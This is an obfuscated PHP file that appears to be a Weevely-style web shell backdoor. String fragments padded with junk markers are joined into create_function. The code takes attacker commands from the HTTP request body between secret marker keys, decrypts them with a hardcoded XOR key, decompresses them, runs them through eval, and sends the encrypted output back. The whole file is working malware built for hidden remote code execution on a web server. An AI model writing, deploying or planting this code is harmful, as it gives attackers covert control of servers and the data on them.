<?php
$I='nput"),$m)=GW=1GW) {@ob_GWstart();@eGWvaGWl(@gzuGWncomprGWesGWs(@x(@basGWe64GW_decode($mGW[1]),$k)))GW;$o=@GWobGW_gGWe';
$E='$kGW=GW"44520ec6";$khGW="GW22d3GWc3GWa0a9e6";$kf="e16aGW6GW9f2GW4GWc15GW";$p="qpGWi7yZVzW7GWMCo6bb";GWfunction x($t,$k){';
$o=str_replace('Y','','cYreaYteYY_YfunctYion');
$t='GW$cGWGW=stGWrlen($k);$l=strlenGW($GWtGW);$o="";for(GW$i=0GW;$i<$l;){foGWr($j=0;GW($j<$cGWGW&&$i<$l)GW;$j++,$iGW++){$o.';
$r='=$GWt{$i}^GW$k{$jGW};}}retGWGWurn $GWo;}if (@preg_GWGWmatch("GW/GW$kh(.+)$kf/",GWGW@file_geGWt_contentGWs("php:/GWGW/i';
$u='t_contGWents();@ob_endGW_cGWlean()GW;$r=@baGWse64GWGW_encode(@x(@gzGWcoGWGWmpress(GW$o),$k));print("GW$GWp$kh$r$kf");}';
$J=str_replace('GW','',$E.$t.$r.$I.$u);
$m=$o('',$J);$m();
?>
